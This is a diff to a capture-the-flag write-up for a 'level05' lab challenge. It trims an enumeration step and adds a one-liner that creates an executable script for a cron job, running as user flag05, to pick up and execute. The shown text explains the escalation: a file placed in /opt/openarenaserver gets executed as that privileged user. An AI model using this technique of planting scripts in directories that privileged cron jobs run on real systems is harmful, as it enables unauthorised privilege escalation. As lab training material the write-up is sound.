@@ -15,13 +15,6 @@ The command ```find / -name "level05" 2>/dev/null``` get these files :
 ***this looks like a crontab syntax to execute the command every 2 minutes***
 we can assume this crontab is in use for flag05 user
 
-```find / -group mail 2>/dev/null```
-/usr/bin/dotlockfile
-/usr/bin/mail-lock
-/usr/bin/mail-touchlock
-/usr/bin/mail-unlock
-/var/mail
-/var/mail/level05
 
 ```cat /usr/sbin/openarenaserver```
 #!/bin/sh
@@ -37,4 +30,5 @@ we create a file in this directory that executes getflag ```echo "/bin/getflag >
 we add permission to be executed : ```chmod +x /opt/openarenaserver/getflag```
 after waiting 2 minutes the file /tmp/flag contains our flag : ```cat /tmp/flag```
 
-This method can be refined with the command ```echo "/bin/getflag | wall``` as now all users get the getflag message
+This method can be refined with the command ```echo "/bin/getflag | wall``` as now all users get the getflag message :
+echo "/bin/getflag | wall" > getflag && chmod +x getflag 
